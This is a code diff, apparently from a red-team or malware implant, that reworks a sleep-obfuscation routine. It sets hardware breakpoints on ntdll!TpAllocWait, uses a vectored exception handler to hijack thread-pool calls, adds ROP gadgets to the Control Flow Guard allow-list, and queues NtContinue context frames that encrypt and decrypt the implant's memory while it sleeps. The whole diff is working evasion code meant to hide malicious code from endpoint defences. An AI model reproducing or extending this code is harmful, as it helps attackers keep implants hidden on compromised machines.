@@ -65,6 +65,18 @@ SystemFunction032(
 
 typedef struct
 {
+	D_API( SetProcessValidCallTargets );
+} CFG_API ;
+
+typedef struct
+{
+	D_API( RtlRemoveVectoredExceptionHandler );
+	D_API( RtlAddVectoredExceptionHandler );
+	D_API( RtlRegisterWait );
+} HCK_API ;
+
+typedef struct
+{
 	D_API( NtQueryInformationThread );
 	D_API( LdrGetProcedureAddress );
 	D_API( NtWaitForSingleObject );
@@ -92,11 +104,8 @@ typedef struct
 typedef struct
 {
 	D_API( CloseThreadpoolCleanupGroupMembers );
-	D_API( RtlRemoveVectoredExceptionHandler );
 	D_API( NtSignalAndWaitForSingleObject );
-	D_API( RtlAddVectoredExceptionHandler );
 	D_API( CreateThreadpoolCleanupGroup );
-	D_API( SetProcessValidCallTargets );
 	D_API( SetThreadpoolThreadMaximum );
 	D_API( SetThreadpoolThreadMinimum );
 	D_API( NtQueryInformationThread );
@@ -115,7 +124,6 @@ typedef struct
 	D_API( NtDuplicateObject );
 	D_API( NtCreateThreadEx );
 	D_API( CreateThreadpool );
-	D_API( RtlRegisterWait );
 	D_API( NtSuspendThread );
 	D_API( NtGetNextThread );
 	D_API( CloseThreadpool );
@@ -400,11 +408,12 @@ static D_SEC( E ) PVOID GetJmpRaxTarget( VOID )
  * Uses DR3 to trigger the breakpoint without issue.
  *
 !*/
-static D_SEC( E ) VOID EnableBreakpoint( _In_ PVOID Addr )
+static D_SEC( E ) NTSTATUS EnableBreakpoint( _In_ PVOID Addr )
 {
 	API		Api;
 	CONTEXT		Ctx;
 
+	NTSTATUS	Nst = 0;
 	ULONG_PTR	Bit = 0;
 	ULONG_PTR	Msk = 0;
 
@@ -416,22 +425,25 @@ static D_SEC( E ) VOID EnableBreakpoint( _In_ PVOID Addr )
 	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
 
 	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
 
-	/* Set DR3 to the specified address */
-	Ctx.Dr3 = U_PTR( Addr );
+	if ( NT_SUCCESS( ( Nst = Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) ) {
+		/* Set DR3 to the specified address */
+		Ctx.Dr3 = U_PTR( Addr );
 
-	/* Set DR7 */
-	Ctx.Dr7 &= ~( 3ULL << ( 16 + 4 * 3 ) );
-	Ctx.Dr7 &= ~( 3ULL << ( 18 + 4 * 3 ) );
-	Ctx.Dr7 |= 1ULL << ( 2 * 3 );
+		/* Set DR7 */
+		Ctx.Dr7 &= ~( 3ULL << ( 16 + 4 * 3 ) );
+		Ctx.Dr7 &= ~( 3ULL << ( 18 + 4 * 3 ) );
+		Ctx.Dr7 |= 1ULL << ( 2 * 3 );
 
-	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
-
+		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+		Nst = Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+	};
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+
+	/* Status */
+	return Nst;
 };
 
 /*!
@@ -442,11 +454,12 @@ static D_SEC( E ) VOID EnableBreakpoint( _In_ PVOID Addr )
  *
 !*/
 
-static D_SEC( E ) VOID RemoveBreakpoint( _In_ PVOID Addr )
+static D_SEC( E ) NTSTATUS RemoveBreakpoint( _In_ PVOID Addr )
 {
 	API		Api;
 	CONTEXT		Ctx;
 
+	NTSTATUS	Nst = 0;
 	ULONG_PTR	Msk = 0;
 	ULONG_PTR	Bit = 0;
 
@@ -458,18 +471,21 @@ static D_SEC( E ) VOID RemoveBreakpoint( _In_ PVOID Addr )
 	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
 
 	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
 
-	/* Set DR7 */
-	Ctx.Dr3  = 0;
-	Ctx.Dr7 &= ~( 1ULL << ( 2 * 3 ) ); 
+	if ( NT_SUCCESS( ( Nst = Api.NtGetContextThread( NtCurrentThread(), &Ctx ) ) ) ) {
+		/* Set DR7 */
+		Ctx.Dr3  = 0;
+		Ctx.Dr7 &= ~( 1ULL << ( 2 * 3 ) ); 
 
-	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
-
+		Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+		Nst = Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+	};
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+
+	/* Status */
+	return Nst;
 };
 
 /*!
@@ -484,22 +500,19 @@ static D_SEC( E ) VOID RemoveBreakpoint( _In_ PVOID Addr )
 static D_SEC( E ) NTSTATUS NTAPI TpAllocWaitHook( _Out_ PTP_WAIT **Out, _In_ PTP_WAIT_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
 {
 	PTABLE		Tbl = NULL;
-	NTSTATUS 	Ret = STATUS_SUCCESS;
+	NTSTATUS 	Ret = STATUS_UNSUCCESSFUL;
 
 	/* Get a pointer to Table */
 	Tbl = C_PTR( G_SYM( Table ) );
 
 	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
-	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
-
-	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
-	Ret = ( ( __typeof__( TpAllocWaitHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) )(
-		Out, Callback, Context, & Tbl->Table->Debugger.PoolEnv
-
-	);
-
-	/* Enables a breakpoint on the ntdll!TpAllocTimer */
-	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
+	if ( NT_SUCCESS( RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) ) ) {
+		/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
+		Ret = ( ( __typeof__( TpAllocWaitHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) )(
+			Out, Callback, Context, & Tbl->Table->Debugger.PoolEnv
+	
+		);
+	};
 
 	/* Return */
 	return Ret;
@@ -544,6 +557,53 @@ static D_SEC( E ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf 
  *
  * Purpose:
  *
+ * Inserts a breakpoint to force RtlRegisterWait
+ * to use our thread pool, then calls the func
+ * as normal.
+ *
+!*/
+static D_SEC( E ) NTSTATUS NTAPI RtlRegisterWaitWrap(
+	_In_ PHANDLE NewWaitObject,
+	_In_ HANDLE Object,
+	_In_ WAITORTIMERCALLBACKFUNC Callback,
+	_In_ PVOID Context,
+	_In_ ULONG Milliseconds,
+	_In_ ULONG Flags
+)
+{
+	HCK_API		Api;
+	PVOID		Veh = NULL;
+	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+
+	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
+	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
+	Api.RtlRegisterWait                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREGISTERWAIT );
+
+	/* Insert a Vectored Exception Handling callback to act as a hooking debugger */
+	if ( ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) != NULL ) {
+		/* Insert a breakpoint into ntdll!TpAllocWait */
+		if ( NT_SUCCESS( EnableBreakpoint( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) ) ) {
+			/* Call the API, which will then 'hooked' */
+			Nst = Api.RtlRegisterWait( NewWaitObject, Object, Callback, Context, Milliseconds, Flags );
+		};
+		/* Remove the VEH handler */
+		Api.RtlRemoveVectoredExceptionHandler( Veh );
+	};
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+
+	/* Status */
+	return Nst;
+};
+
+/*!
+ *
+ * Purpose:
+ *
  * Adds a ROP gadget to the CFG exception list to
  * permit ROP gadgets from being marked as an
  * invalid target.
@@ -551,7 +611,7 @@ static D_SEC( E ) LONG WINAPI VehDebugger( _In_ PEXCEPTION_POINTERS ExceptionIf 
 !*/
 static D_SEC( E ) VOID CfgEnableFunc( _In_ PVOID ImageBase, _In_ PVOID Function )
 {
-	API			Api;
+	CFG_API			Api;
 	CFG_CALL_TARGET_INFO	Cfg;
 
 	SIZE_T			Len = 0;
@@ -611,7 +671,6 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 	SIZE_T			XLn = 0;
 	SIZE_T			FLn = 0;
 
-	PVOID			Veh = NULL;
 	PVOID			Ev1 = NULL;
 	PVOID			Ev2 = NULL;
 	PVOID			Ev3 = NULL;
@@ -655,29 +714,26 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 
-	Api.RtlRemoveVectoredExceptionHandler = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREMOVEVECTOREDEXCEPTIONHANDLER ); 
-	Api.RtlAddVectoredExceptionHandler    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLADDVECTOREDEXCEPTIONHANDLER );
-	Api.NtSignalAndWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
-	Api.LdrGetProcedureAddress            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
-	Api.NtWaitForSingleObject             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
-	Api.RtlInitUnicodeString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
-	Api.RtlCopyMappedMemory               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
-	Api.NtGetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
-	Api.NtSetContextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
-	Api.RtlDeregisterWait                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDEREGISTERWAIT );
-	Api.RtlCaptureContext                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
-	Api.RtlInitAnsiString                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
-	Api.NtDuplicateObject                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
-	Api.RtlRegisterWait                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREGISTERWAIT );
-	Api.NtGetNextThread                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
-	Api.RtlAllocateHeap                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
-	Api.NtResumeThread                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
-	Api.NtCreateEvent                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
-	Api.LdrUnloadDll                      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
-	Api.RtlFreeHeap                       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
-	Api.LdrLoadDll                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
-	Api.NtContinue                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
-	Api.NtClose                           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
+	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
+	Api.LdrGetProcedureAddress         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRGETPROCEDUREADDRESS );
+	Api.NtWaitForSingleObject          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
+	Api.RtlInitUnicodeString           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING ); 
+	Api.RtlCopyMappedMemory            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
+	Api.NtGetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
+	Api.NtSetContextThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
+	Api.RtlDeregisterWait              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLDEREGISTERWAIT );
+	Api.RtlCaptureContext              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCAPTURECONTEXT );
+	Api.RtlInitAnsiString              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITANSISTRING );
+	Api.NtDuplicateObject              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
+	Api.NtGetNextThread                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETNEXTTHREAD );
+	Api.RtlAllocateHeap                = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
+	Api.NtResumeThread                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
+	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
+	Api.LdrUnloadDll                   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
+	Api.RtlFreeHeap                    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+	Api.LdrLoadDll                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
+	Api.NtContinue                     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
+	Api.NtClose                        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
 
 	/* Load kernel32.dll if it somehow isnt already! */
 	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );
@@ -753,11 +809,7 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 					/* Abort! */
 					break;
 				};
-				/* Add an exception handler to handle hooking. */
-				if ( ! ( Veh = Api.RtlAddVectoredExceptionHandler( 1, C_PTR( G_SYM( VehDebugger ) ) ) ) ) {
-					/* Abort! */
-					break;
-				};
+	
 				/* Initialize the thread pool environment */
 				InitializeThreadpoolEnvironment( &Tbl->Table->Debugger.PoolEnv );
 
@@ -784,15 +836,12 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 				SetThreadpoolCallbackPool( & Tbl->Table->Debugger.PoolEnv, Pol );
 				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
 
-				/* Add breakpoint on ntdll!TpAllocTimer */
-				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
-
 				/* Flags to query for! */
 				Ctx.ContextFlags = CONTEXT_FULL;
 
 				/* Create the first time and spawn the new thread */
-				if ( NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.RtlCaptureContext, &Ctx, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
-					if ( NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.SetEvent, Ev1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
+				if ( NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.RtlCaptureContext, &Ctx, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
+					if ( NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.SetEvent, Ev1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) {
 						if ( NT_SUCCESS( Api.NtWaitForSingleObject( Ev1, FALSE, NULL ) ) ) {
 							if ( !( Cap = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) ) ) ) {
 								/* Abort! */
@@ -1010,33 +1059,26 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 										End->Rcx  = U_PTR( Ev3 );
 
 										/* Query all the API calls in the order in which they need to run */
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Beg, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Set, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Enc, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Gt1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, St1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Sev, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Blk, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Cp3, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, St2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Dec, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, Res, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
-										if ( ! NT_SUCCESS( Api.RtlRegisterWait( &Que, Ev4, Api.NtContinue, End, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Beg, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Set, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Enc, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Gt1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, St1, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Sev, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Blk, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Cp3, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, St2, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Dec, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, Res, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
+										if ( ! NT_SUCCESS( RtlRegisterWaitWrap( &Que, Ev4, Api.NtContinue, End, Del += 100, WT_EXECUTEINWAITTHREAD | WT_EXECUTEONLYONCE ) ) ) break;
 
-										/* Remove the breakpoint on ntdll!TpAllocTimer */
-										RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
+										/* Adjust the offset before setting our new frame */
+										Ctx.Rsp -= U_PTR( sizeof( PVOID ) );
 
-										/* Remove the Vectored Exception Handler! */
-										if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
-
-											/* Adjust the offset before setting our new frame */
-											Ctx.Rsp -= U_PTR( sizeof( PVOID ) );
-
-											/* Execute and await the frame results! */
-											Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
-										};
+										/* Execute and await the frame results! */
+										Api.NtSignalAndWaitForSingleObject( Ev2, Ev3, FALSE, NULL ); 
 									};
 								};
 							};
@@ -1104,13 +1146,6 @@ static D_SEC( E ) VOID WINAPI ObfSleepFiber( _In_ PFIBER_PARAM Parameter )
 			};
 			if ( End != NULL ) {
 				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
-			};
-			if ( Veh != NULL ) {
-				/* Remove the breakpoint on ntdll!TpAllocTimer */
-				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCWAIT ) ) );
-
-				/* Remove the Vectored Exception Handler */
-				Api.RtlRemoveVectoredExceptionHandler( Veh );
 			};
 			if ( Cln != NULL ) {
 				/* Close the thread pool cleanup */
